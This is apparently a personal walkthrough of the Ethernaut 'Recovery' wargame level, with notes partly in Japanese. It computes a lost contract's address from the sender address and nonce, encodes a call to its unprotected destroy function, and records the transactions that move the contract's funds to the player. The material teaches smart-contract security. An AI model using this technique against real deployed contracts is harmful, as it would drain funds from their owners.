## Ethernaut-solution

### 17. Recovery

*Important

//is gonna give you the smart contract address that you're looking for so 

//this is all computed deterministically 
```
address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
```

//nonce creates or generated this simple token contract and we're passing it to the rlp encoding function 
```
>contract.address
'0x0A4a5914d6a3F59863639EdE0b3d8f5B6E8c9473'
```

//secret addressを抜粋してみる
```
>web3.utils.soliditySha3("0xd6","0x94","0x0A4a5914d6a3F59863639EdE0b3d8f5B6E8c9473","0x01") //rlp,rlp, sender address, nonce
'0xa01cfea9bdb7e3e4b516448a200e3409bef9910e02454a6a70f04bd8ac6acc4e' //40digits(20bits) is our contracts address from right side 
```
```
this is the simpleToken address (secret address)

200e3409bef9910e02454a6a70f04bd8ac6acc4e
```

//secret address (EtherScanで確認済み)
```
0x200e3409bef9910e02454A6a70f04bD8aC6ACC4E
```

*anything beginning with “0x” simply means the value is in hexadecimal format. 


//encode a function call to the destroy function. Its going to pass my players address"_to"
```
>data = web3.eth.abi.encodeFunctionCall ({
	name: 'destroy',
	type: 'function',
	inputs: [{
		type: 'address',
		name: '_to'
	}]
}, [player]);

'0x00f55d9d000000000000000000000000f6ea8e869c68362ec2fa1b2159fe459d6d8f30f5'
```

//playerが自分になったことを確認
```
>player
'0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'
```
```
>await web3.eth.sendTransaction ({
	to: "", //<insert the address of the lost contract>
	from: player,
	data: data
})//Deploy on Remix 

[block:10931562 txIndex:2]from: 0xF6e...f30F5to: RecoveryAttack.(constructor)value: 0 weidata: 0x608...f0033logs: 0hash: 0x632...16e03
```

//copy the secret address into attack 
```
[block:10931570 txIndex:8]from: 0xF6e...f30F5to: RecoveryAttack.attack(address) 0x51F...D4AEAvalue: 0 weidata: 0xd01...acc4elogs: 0hash: 0x34d...e45b1
```

//check secret address all funds into my wallet!!